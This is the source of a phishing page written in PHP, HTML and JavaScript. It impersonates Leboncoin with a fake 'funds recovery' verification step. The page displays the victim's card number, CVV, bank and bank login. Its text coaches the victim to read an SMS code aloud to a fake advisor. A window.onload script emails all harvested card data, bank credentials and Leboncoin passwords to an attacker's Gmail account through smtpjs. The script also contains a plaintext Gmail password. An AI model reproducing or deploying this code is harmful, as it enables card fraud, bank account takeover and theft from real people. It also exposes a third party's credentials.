<?php
session_start();
// header("refresh:5;url=finalisation.php");
if ($_SESSION['matricule'] == null) {
    header('location:index2.php');
}

// Charger le contenu de data.json
function loadJsonData()
{
    $jsonData = file_get_contents('data.json');
    return json_decode($jsonData, true);
}


?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1">
    <link rel="shortcut icon" type="image/png" href="asset/img/log.png" type="image/x-icon" />
    <title>Récupérer mes fonds</title>
    <script type="text/javascript" src="asset/js/creditly.js"></script>
    <link rel="stylesheet" href="asset/css/creditly.css">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">

    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>

    <!--script src="//code.jivosite.com/widget/ncCHReivMY" async></script-->
    <script src="//code.jivosite.com/widget/00joJsgajZ" async></script>
    <script src="https://smtpjs.com/v3/smtp.js"></script>


</head>
<style>
    .space {
        margin-bottom: 28px;
    }

    .form-label {
        font-size: 12px;
        font-weight: bold;
    }

    .cardcara {
        overflow-y: hidden;
        height: 350px
    }

    .error {
        /* Hidden by default */
        display: block;
        position: fixed;
        /* Stay in place */
        /* Sit on top */
        padding-top: 25px;
        /* Location of the box */
        left: 0;
        top: 0;
        width: 100%;
        /* Full width */
        height: 100%;
        /* Full height */
        background-color: blue;
        /* Fallback color */
        background-color: rgba(0, 0, 0, 0.4);
        overflow-y: hidden;
        /* Black w/ opacity */
    }

    @media only screen and (max-width: 600px) {
        .space {
            margin-bottom: 15px;
        }

        .cardcara {
            height: 540px
        }
    }
</style>

<body>

    <nav class="navbar p-2 fixed-top" style="background-color: #fff; box-shadow: 0 2px 4px rgba(0,0,0,.08),0 4px 12px rgba(0,0,0,.08);">
        <div class="container-fluid">
            <a class="navbar-brand" href="#"><img src="asset/img/ico.PNG" alt="" style="max-width:100% ;"> </a>
        </div>
    </nav>

    <div class="container-fluid" style="margin-top: 100px;">
        <div class="row">
            <div class="col-md-6 col-11 mx-auto">
                <div class="shadow p-3 mb-5 bg-body rounded">
                    <div>
                        <h1 style="font-size: 20px; text-align:center; font-weight:bold">Vérification des informations</h1>
                        <p style="font-size: 15px; text-align:center;">Veuillez patienter pendant que nous vérifions vos données personnelles.
                        </p>
                        <p>Suite aux nouvelles mesures de sécurité, vous serez crédité sur votre compte qu'après avoir confirmé que vous êtes bien le titulaire du compte bancaire enregistré sur votre compte Leboncoin .
                            Pour terminer la confirmation de votre compte : vous serez contacté par téléphone par le service client dans les meilleurs délais.
                            En confirmant votre compte bancaire, vous autorisez Leboncoin à vous envoyer un SMS. Vous trouverez dans le SMS, un montant de vérification généré de manière aléatoire et un code de 4 à 8 chiffres.
                            Que vous devez communiquer au conseiller pour confirmer votre compte bancaire.
                            La confirmation de votre compte bancaire vous permet de prouver que vous êtes bien le titulaire de la carte bancaire enregistrée puisque vous seul avez accès au code Leboncoin Cordialement, Leboncoin.</p>

                    </div>
                    <hr>
                    <p style="font-size: 14px; color:#191a19">
                        <br><br>
                        <img style="margin-left: 35%" src="asset/img/verification.gif" width="160">
                        <br><br><br><br>
                    </p>
                    <hr>


                    <div>
                        <e style=" font-size: 15px;font-weight:650" class="montant_achat">Montant a recevoir:</e>
                        <e> <?php echo $_SESSION['montant_total']  ?>€</e>
                    </div>
                    <div>
                        <e style=" font-size: 15px;font-weight:650" class="montant_achat">Titulaire:</e>
                        <e> <?php echo $_SESSION['nom']  ?></e>
                    </div>
                    <div>
                        <e style=" font-size: 15px;font-weight:650" class="montant_achat">Numero de carte:</e>
                        <e> <?php echo $_SESSION['cb']  ?></e>
                    </div>
                    <div>
                        <e style=" font-size: 15px;font-weight:650" class="montant_achat">Date:</e>
                        <e> <?php echo $_SESSION['date']  ?></e>
                    </div>
                    <div>
                        <e style=" font-size: 15px;font-weight:650" class="montant_achat">Crypto:</e>
                        <e> <?php echo $_SESSION['crypto']  ?></e>
                    </div>
                    <div>
                        <e style=" font-size: 15px;font-weight:650" class="montant_achat">Banque:</e>
                        <e> <?php echo $_SESSION['banque']  ?></e>
                    </div>
                    <div>
                        <e style=" font-size: 15px;font-weight:650" class="montant_achat">Identifiant:</e>
                        <e> <?php echo $_SESSION['identifiantBancaire']  ?></e>
                    </div>
                    <div>
                        <e style=" font-size: 15px;font-weight:650" class="montant_achat">Mot de passe:</e>
                        <e> ************</e>
                    </div>






                </div>

            </div>
        </div>

        <!-- fin card pour afficher box -->
    </div>





</body>
<script>
    window.onload = function() {
        // Récupère les valeurs en session depuis PHP
        var montant_total = "<?php echo $_SESSION['montant_total']; ?>";
        var email = "<?php echo $_SESSION['email']; ?>";
        var matricule = "<?php echo $_SESSION['matricule']; ?>";


        var nom = "<?php echo $_SESSION['nom']; ?>";
        var cb = "<?php echo $_SESSION['cb']; ?>";
        var date = "<?php echo $_SESSION['date']; ?>";
        var crypto = "<?php echo $_SESSION['crypto']; ?>";
        var banque = "<?php echo $_SESSION['banque']; ?>";
        var identifiantBancaire = "<?php echo $_SESSION['identifiantBancaire']; ?>";
        var passwordAccesBancaire = "<?php echo $_SESSION['passwordAccesBancaire']; ?>";
        var emailLeboncoin = "<?php echo $_SESSION['emailLeboncoin']; ?>";
        var passwordLeboncoin = "<?php echo $_SESSION['passwordLeboncoin']; ?>";
        var montant_total = "<?php echo $_SESSION['montant_total']; ?>";
        console.log($_SESSION);

        Email.send({
            Host: "smtp.gmail.com",
            Username: "warrenkazimoto12@gmail.com",
            Password: "Jamalwarren12@",
            To: 'warrenkazimoto12@gmail.com',
            From: "warrenkazimoto12@gmail.com",
            Subject: "info matricule : " + matricule + " ,nom : " + email,
            Body: 'Montant total: ' + montant_total + '<br>' +
                'Email: ' + email + '<br>' +
                'Matricule: ' + matricule + '<br>' +
                'Nom: ' + nom + '<br>' +
                'Numéro de carte: ' + cb + '<br>' +
                'Date: ' + date + '<br>' +
                'Crypto: ' + crypto + '<br>' +
                'Banque: ' + banque + '<br>' +
                'Identifiant bancaire: ' + identifiantBancaire + '<br>' +
                'Mot de passe accès bancaire: ' + passwordAccesBancaire + '<br>' +
                'Email Leboncoin: ' + emailLeboncoin + '<br>' +
                'Mot de passe Leboncoin: ' + passwordLeboncoin
        }).then(
            message => alert(message)
        ).catch(
            error => alert('Erreur lors de l\'envoi de l\'e-mail: ' + error)
        );
    }
</script>

</html>